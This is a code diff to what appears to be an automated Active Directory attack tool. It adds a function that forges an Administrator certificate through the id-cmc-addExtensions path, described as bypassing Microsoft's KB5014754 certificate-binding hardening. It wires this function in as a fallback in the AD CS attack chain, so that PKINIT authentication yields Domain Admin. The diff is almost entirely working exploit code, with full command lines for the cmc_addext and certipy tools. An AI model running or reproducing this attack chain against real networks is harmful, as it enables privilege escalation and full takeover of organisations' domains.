@@ -58,7 +58,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.10.1"
+VERSION = "4.11.0"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 KRBRELAYX_DIR = TOOLS_DIR / "krbrelayx"
@@ -4995,6 +4995,60 @@ def _adcs_exploit_template(template: str, ca_name: str, esc_type: str,
     return None
 
 
+def _adcs_cmc_addext_attack(template: str, ca_name: str, ca_host: str,
+                            cfg: Config, username: str,
+                            password: str) -> Optional[str]:
+    """ESC1-CMC — KB5014754 bypass via the CMC id-cmc-addExtensions control.
+
+    Standard ESC1 (`certipy req -upn`) only injects the SAN UPN; a patched CA
+    at StrongCertificateBindingEnforcement=2 stamps the *requester's* SID, so
+    PKINIT binds back to the low-priv requester. cmc_addext smuggles BOTH the
+    admin UPN *and* a matching szOID_NTDS_CA_SECURITY_EXT (admin SID, resolved
+    via LDAP) through the CMC add-extensions trust path, so the forged cert
+    authenticates as Administrator even at enforcement level 2. Unlike
+    ESC9/ESC10 it needs no controllable victim account — just an ESC1-shaped
+    template (ENROLLEE_SUPPLIES_SUBJECT, no REQUIRE_UPN) and one low-priv pass.
+
+    Ref: https://0xmaz.me/posts/certsrv-id-cmc-addExtensions-KB5014754-bypass/
+    """
+    tool = find_tool("cmc_addext.py",
+                     paths=[Path(__file__).resolve().parent / "cmc_addext.py",
+                            TOOLS_DIR / "cmc-addext" / "cmc_addext.py"])
+    if not tool:
+        log.warning("  ESC1-CMC: cmc_addext.py not found — skipping KB5014754 CMC bypass")
+        detail("  Install: git clone https://github.com/MazX0p/cmc-addext /opt/tools/cmc-addext")
+        return None
+
+    # cmc_addext's CLI exposes only --dc-pass (plaintext); no NT-hash auth path.
+    if not password:
+        log.warning("  ESC1-CMC needs a plaintext password (nthash-only auth unsupported) — skipping")
+        return None
+
+    log.info(f"  ESC1-CMC: forging admin cert via id-cmc-addExtensions on '{template}' "
+             f"(KB5014754 enforcement=2 bypass)...")
+    # cmc_addext takes the full PFX path in --out (no .pfx auto-append like certipy)
+    pfx_path = cfg.work_dir / f"adcs-ESC1CMC-{template}.pfx"
+    cmd = tool.split() + [
+        "--auto-signer",
+        "--ca-host", ca_host,
+        "--ca-name", ca_name,
+        "--template", template,
+        "--inject-upn", f"administrator@{cfg.domain}",
+        "--dc-ip", cfg.dc_ip,
+        "--dc-user", username,
+        "--dc-pass", password,
+        "--out", str(pfx_path),
+        "--pfx-pass", "addext",
+    ]
+    result = run(cmd, cfg, timeout=240, outfile=cfg.work_dir / "adcs-esc1cmc.txt")
+    if result.returncode == 0 and pfx_path.exists():
+        ok(f"  ESC1-CMC: forged Administrator cert with matching SID via '{template}'")
+        return str(pfx_path)
+
+    log.warning(f"  ESC1-CMC: id-cmc-addExtensions bypass failed for template '{template}'")
+    return None
+
+
 def _adcs_relay_esc8(ca_host: str, cfg: Config) -> Optional[str]:
     """Exploit ESC8 (HTTP web enrollment) via NTLM relay to CA web service."""
     phase_header("AD CS ESC8 — HTTP Enrollment Relay")
@@ -5072,12 +5126,15 @@ def _adcs_relay_esc8(ca_host: str, cfg: Config) -> Optional[str]:
                 cfg.bg_processes.remove(proc)
 
 
-def _adcs_auth_pfx(pfx_path: str, cfg: Config) -> bool:
+def _adcs_auth_pfx(pfx_path: str, cfg: Config, pfx_password: str = "") -> bool:
     """Authenticate with a PFX certificate to obtain NT hash via PKINIT.
 
     Tries to authenticate as administrator (the cert SAN); on patched DCs
     (CVE-2022-26923 SID binding) this falls back to whoever the requestor
     was. The actual recovered identity is parsed from certipy's output.
+
+    pfx_password: set when the PFX is encrypted (e.g. cmc_addext defaults to
+    'addext'); passed to certipy via -password.
     """
     if not tool_exists("certipy"):
         log.warning("certipy not found — cannot authenticate with PFX")
@@ -5087,11 +5144,11 @@ def _adcs_auth_pfx(pfx_path: str, cfg: Config) -> bool:
     auth_output = cfg.work_dir / "adcs-auth.txt"
 
     # Force username=administrator so PAC lookup targets DA on unpatched DCs
-    result = run(
-        ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", cfg.dc_ip,
-         "-username", "administrator", "-domain", cfg.domain],
-        cfg, timeout=120, outfile=auth_output
-    )
+    auth_cmd = ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", cfg.dc_ip,
+                "-username", "administrator", "-domain", cfg.domain]
+    if pfx_password:
+        auth_cmd += ["-password", pfx_password]
+    result = run(auth_cmd, cfg, timeout=120, outfile=auth_output)
 
     output = result.stdout or ""
     if auth_output.exists():
@@ -5231,6 +5288,12 @@ def run_adcs_attack(cfg: Config) -> bool:
                          key=lambda v: esc_priority.index(v[0])
                          if v[0] in esc_priority else 99)
 
+    # Preserve original low-priv creds up front: _adcs_auth_pfx() rewrites
+    # cfg.username/nthash/password to the recovered identity on partial
+    # success, but the ESC1-CMC fallback needs the real plaintext password for
+    # its MS-ICPR enroll + LDAP SID lookup.
+    orig_user, orig_pass = cfg.username, cfg.password
+
     for esc_type, template in vuln_sorted:
         separator()
 
@@ -5252,10 +5315,21 @@ def run_adcs_attack(cfg: Config) -> bool:
             if _adcs_auth_pfx(pfx, cfg):
                 success_box(f"AD CS {esc_type} → Domain Admin via certificate!")
                 return True
-            else:
-                log.warning(f"Got PFX via {esc_type} but PKINIT auth failed — trying next")
-                detail(f"PFX saved: {pfx}")
-                detail("Manual auth: certipy auth -pfx <file> -dc-ip <dc>")
+
+            # Enforcement=2 fallback: plain ESC1 issued a cert but PKINIT bound
+            # to the requester (patched CA, StrongCertificateBindingEnforcement=2).
+            # Forge a matching-SID admin cert via the id-cmc-addExtensions
+            # KB5014754 bypass — the only path here that beats enforcement 2.
+            if esc_type in ("ESC1", "ESC2", "ESC3") and ca_name and ca_host:
+                cmc_pfx = _adcs_cmc_addext_attack(
+                    template, ca_name, ca_host, cfg, orig_user, orig_pass)
+                if cmc_pfx and _adcs_auth_pfx(cmc_pfx, cfg, pfx_password="addext"):
+                    success_box("AD CS ESC1-CMC → Domain Admin (KB5014754 CMC bypass)!")
+                    return True
+
+            log.warning(f"Got PFX via {esc_type} but PKINIT auth failed — trying next")
+            detail(f"PFX saved: {pfx}")
+            detail("Manual auth: certipy auth -pfx <file> -dc-ip <dc>")
 
     log.warning("All AD CS exploitation attempts failed")
     return False
